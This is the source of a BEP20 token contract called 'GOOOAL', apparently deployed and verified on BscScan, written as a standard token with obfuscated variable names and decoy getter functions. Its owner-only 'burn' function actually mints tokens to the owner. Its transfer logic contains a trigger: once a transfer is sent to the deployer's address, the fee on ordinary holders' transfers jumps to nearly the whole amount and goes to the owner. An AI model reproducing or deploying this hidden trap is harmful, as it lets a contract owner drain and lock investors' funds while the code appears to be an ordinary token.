/**
 *Submitted for verification at BscScan.com on 2022-11-18
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-18 16:08:25 GMT 
 */
 // SPDX-License-Identifier: MIT

pragma solidity >=0.6.0;
contract BBARDAN {
address private  EDIHTA = address(0);
uint256 private  ABMMVZ = 1000000000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
mapping (address => uint256) public balanceOf;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 private  AGHNPR = 1000000000000000000;
uint256 private  OWDHYY = 1000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
string public  symbol = "GOOOAL";
address private  PFVTWS = address(0);
address private  ETLUZQ = address(0);
uint256 private  MCUUWO = 10000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
string public  name = "GOOOAL";
uint256 private  ITPSRG = 10000000000000;
uint256 private  PLLHYS = 1000000000000000;
address private  MQADOH = address(0);
address private  JROCYF = address(0);
uint256 public constant BAJMOQ = 99999;
address public owner;
uint256 private  RZXSTX = 100000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint8 public constant decimals = 18;
function _getJROCYF() private returns (address) {
return JROCYF;
}

function _getABMMVZ() private returns (uint256) {
return ABMMVZ;
}

function _getPFVTWS() private returns (address) {
return PFVTWS;
}

function _getEDIHTA() private returns (address) {
return EDIHTA;
}

function _getRZXSTX() private returns (uint256) {
return RZXSTX;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getPLLHYS() private returns (uint256) {
return PLLHYS;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getAGHNPR() private returns (uint256) {
return AGHNPR;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tYGYZOF 0");
require(spender != address(0), "fYGYZOF 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
constructor () {
ETLUZQ = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getITPSRG() private returns (uint256) {
return ITPSRG;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "YGYZOF");
require(to != address(0), "YGYZOF");
require(amount <= balanceOf[from], "YGYZOF");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* BAJMOQ/OWDHYY ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==ETLUZQ){
OWDHYY = BAJMOQ+2;
}
emit Transfer(from, to, transferAmount);
}
function _getMQADOH() private returns (address) {
return MQADOH;
}

function _getMCUUWO() private returns (uint256) {
return MCUUWO;
}


}